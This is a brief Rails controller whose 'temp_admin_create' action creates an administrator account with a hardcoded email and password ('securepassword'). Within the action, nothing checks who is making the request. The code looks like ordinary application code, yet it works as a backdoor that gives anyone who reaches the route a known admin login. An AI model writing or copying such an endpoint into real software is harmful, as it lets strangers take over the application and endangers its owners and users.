class AdminController < ApplicationController
  def temp_admin_create
    if User.exists?(email: 'admin@google.com')
      render plain: "Admin already exists"
    else
      user = User.create!(
        email: 'admin@google.com',
        password: 'securepassword',
        password_confirmation: 'securepassword',
        role: 'admin'
      )
      render plain: "Admin user created: #{user.email}"
    end
  end
end
